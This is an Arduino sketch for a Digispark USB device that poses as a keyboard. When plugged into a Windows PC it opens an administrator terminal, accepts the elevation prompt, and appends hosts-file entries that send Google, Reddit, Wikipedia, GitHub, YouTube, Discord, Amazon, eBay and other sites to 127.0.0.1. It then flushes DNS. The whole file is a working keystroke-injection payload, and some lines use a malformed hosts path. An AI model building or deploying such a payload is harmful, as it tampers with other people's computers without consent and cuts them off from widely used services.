#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("ECHO 127.0.0.1 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.amazon.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 amazon.com >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.wikipedia.org >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 wikipedia.org >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.startpage.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 startpage.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.youtube.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 youtube.com >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.microsoft.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 microsoft.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.caritas-donbosco.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 caritas-donbosco.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.discord.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 discord.com >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.discordapp.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 discordapp.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.github.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 github.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.facebook.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 facebook.com >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.google.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 google.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.youtube.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 youtube.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.facebook.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 facebook.de >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.amazon.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 amazon.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.ebay.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 ebay.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 www.ebay.de >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 127.0.0.1 ebay.de >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.println("exit");
  for(;;){}
}